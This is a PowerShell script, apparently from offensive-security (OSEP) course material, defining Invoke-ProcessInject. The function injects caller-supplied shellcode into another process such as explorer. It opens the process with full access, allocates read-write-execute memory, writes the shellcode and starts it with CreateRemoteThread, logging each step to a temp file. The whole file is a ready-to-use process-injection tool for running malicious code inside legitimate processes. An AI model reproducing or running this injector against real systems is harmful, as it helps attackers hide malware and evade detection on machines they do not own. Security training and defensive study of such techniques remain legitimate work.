#Requires -Version 2
<#
.SYNOPSIS  OSEP - Remote process shellcode injection (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
.EXAMPLE   . .\process_inject.ps1
           Invoke-ProcessInject -TargetProcess explorer -Shellcode $buf
           Invoke-ProcessInject -TargetPID 1234 -Shellcode $buf
#>

$LOG = "C:\Windows\Temp\osep_log.txt"

function Write-Log {
    param([string]$msg, [string]$level = "INFO")
    $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "[$ts][$level][ProcessInject] $msg"
    try { Add-Content -Path $LOG -Value $line -EA SilentlyContinue } catch {}
}

function Import-InjectAPI {
    if (-not ([System.Management.Automation.PSTypeName]'InjectAPI').Type) {
        try {
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class InjectAPI {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@ -EA Stop
            Write-Log "InjectAPI compiled OK"
        } catch {
            Write-Log "Add-Type failed: $_" "ERROR"
            return $false
        }
    }
    return $true
}

function Invoke-ProcessInject {
    param(
        [string]$TargetProcess,     # process name (picks first match)
        [int]   $TargetPID,         # or specify PID directly
        [Parameter(Mandatory)]
        [byte[]]$Shellcode
    )

    Write-Log "Invoke-ProcessInject called. SC size=$($Shellcode.Count)"

    if (-not (Import-InjectAPI)) { return }

    # Resolve PID
    if ($TargetPID -eq 0 -and $TargetProcess) {
        $proc = Get-Process -Name $TargetProcess -EA SilentlyContinue | Select-Object -First 1
        if (-not $proc) {
            Write-Log "Process '$TargetProcess' not found. Available: $(Get-Process | Select -Exp Name | Sort -Unique | Join-String -Separator ',')" "ERROR"
            return
        }
        $TargetPID = $proc.Id
        Write-Log "Resolved '$TargetProcess' → PID $TargetPID"
    }
    if ($TargetPID -eq 0) {
        Write-Log "Must specify -TargetProcess or -TargetPID" "ERROR"
        return
    }

    # PROCESS_ALL_ACCESS = 0x1F0FFF
    $PROCESS_ALL_ACCESS     = 0x1F0FFF
    $MEM_COMMIT_RESERVE     = 0x3000
    $PAGE_EXECUTE_READWRITE = 0x40

    Write-Log "Opening process PID=$TargetPID"
    $hProc = [InjectAPI]::OpenProcess($PROCESS_ALL_ACCESS, $false, $TargetPID)
    if ($hProc -eq [IntPtr]::Zero) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Log "OpenProcess failed. Win32Error=$err (try running as SYSTEM/admin, or pick a lower-integrity target)" "ERROR"
        return
    }
    Write-Log "Process handle: 0x$($hProc.ToString('X'))"

    # Allocate memory in target
    Write-Log "VirtualAllocEx in target ($($Shellcode.Count) bytes)"
    $remoteAddr = [InjectAPI]::VirtualAllocEx(
        $hProc, [IntPtr]::Zero,
        [UIntPtr][uint64]$Shellcode.Count,
        $MEM_COMMIT_RESERVE, $PAGE_EXECUTE_READWRITE
    )
    if ($remoteAddr -eq [IntPtr]::Zero) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Log "VirtualAllocEx failed. Win32Error=$err" "ERROR"
        [InjectAPI]::CloseHandle($hProc) | Out-Null
        return
    }
    Write-Log "Remote memory at 0x$($remoteAddr.ToString('X'))"

    # Write shellcode
    $written = [UIntPtr]::Zero
    $ok = [InjectAPI]::WriteProcessMemory($hProc, $remoteAddr, $Shellcode, [UIntPtr][uint64]$Shellcode.Count, [ref]$written)
    if (-not $ok) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Log "WriteProcessMemory failed. Win32Error=$err" "ERROR"
        [InjectAPI]::CloseHandle($hProc) | Out-Null
        return
    }
    Write-Log "Wrote $written bytes to remote process"

    # Create remote thread
    Write-Log "CreateRemoteThread at 0x$($remoteAddr.ToString('X'))"
    $hThread = [InjectAPI]::CreateRemoteThread(
        $hProc, [IntPtr]::Zero, 0, $remoteAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero
    )
    if ($hThread -eq [IntPtr]::Zero) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Log "CreateRemoteThread failed. Win32Error=$err" "ERROR"
        [InjectAPI]::CloseHandle($hProc) | Out-Null
        return
    }

    Write-Log "Remote thread spawned. Handle=0x$($hThread.ToString('X')). Waiting 3s..."
    [InjectAPI]::WaitForSingleObject($hThread, 3000) | Out-Null
    [InjectAPI]::CloseHandle($hThread) | Out-Null
    [InjectAPI]::CloseHandle($hProc)   | Out-Null
    Write-Log "Injection complete"
}
